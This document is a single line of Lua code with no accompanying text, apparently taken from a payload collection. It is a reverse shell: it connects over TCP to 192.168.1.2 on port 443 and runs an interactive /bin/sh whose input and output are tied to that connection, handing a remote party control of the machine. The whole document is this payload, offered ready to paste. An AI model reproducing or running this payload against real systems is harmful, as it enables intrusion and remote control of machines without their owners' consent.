socket = require('socket'); os = require('os');t=socket.tcp();t:connect("192.168.1.2","443");os.execute('/bin/sh -i <&3 >&3 2>&3');
